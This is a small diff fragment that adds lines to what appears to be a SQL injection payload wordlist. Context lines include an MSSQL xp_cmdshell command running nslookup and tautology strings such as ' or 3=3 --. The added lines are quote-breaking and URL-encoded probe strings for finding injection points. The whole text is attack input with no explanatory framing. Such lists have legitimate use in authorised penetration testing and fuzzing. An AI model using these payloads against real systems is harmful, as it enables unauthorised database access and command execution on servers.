@@ -265,3 +265,11 @@ t'exec master..xp_cmdshell 'nslookup www.google.com'--
 ' or ''='
 ' or 3=3
  or 3=3 --
+'+'herp 
+" / %22 
+; / %3B 
+' ' DERP
+%25%27 
+`+HERP 
+'||'DERP 
+%%2727 
